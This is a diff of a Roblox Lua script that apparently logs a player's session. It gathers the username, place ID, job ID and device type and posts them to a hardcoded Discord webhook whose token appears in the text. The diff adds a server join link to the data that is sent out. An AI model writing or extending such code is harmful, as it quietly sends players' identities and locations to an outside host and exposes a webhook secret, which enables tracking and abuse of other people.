@@ -7,7 +7,6 @@ local tweenService = game:GetService("TweenService")
 
 local webhookUrl = "https://discord.com/api/webhooks/1322910314534010880/Fx3dNcAnfeP5iGp9yGEGnHt217Jq_eni_Wt7WOS7AJJPT0oGoYMhO9fHM22s7zr4ujJp"
 
-
 local function gatherInfo()
     local info = {
         Username = players.LocalPlayer.Name,
@@ -19,8 +18,10 @@ local function gatherInfo()
     return info
 end
 
-
 local function sendToWebhook(data)
+    local jobId = data.JobId
+    local joinLink = "https://www.roblox.com/join-game/" .. jobId
+
     local payload = {
         ["content"] = "Collected Roblox Session Data",
         ["embeds"] = {{
@@ -31,6 +32,7 @@ local function sendToWebhook(data)
                 {["name"] = "Place ID", ["value"] = tostring(data.PlaceId), ["inline"] = true},
                 {["name"] = "Job ID", ["value"] = data.JobId, ["inline"] = true},
                 {["name"] = "Device Type", ["value"] = data.Device, ["inline"] = true},
+                {["name"] = "Server Join Link", ["value"] = joinLink, ["inline"] = false},
             },
             ["color"] = 0x7289DA
         }}
@@ -161,7 +163,6 @@ userInputService.InputBegan:Connect(function(input, gameProcessed)
         end
     end
 end)
-
 
 spawn(function()
     while true do
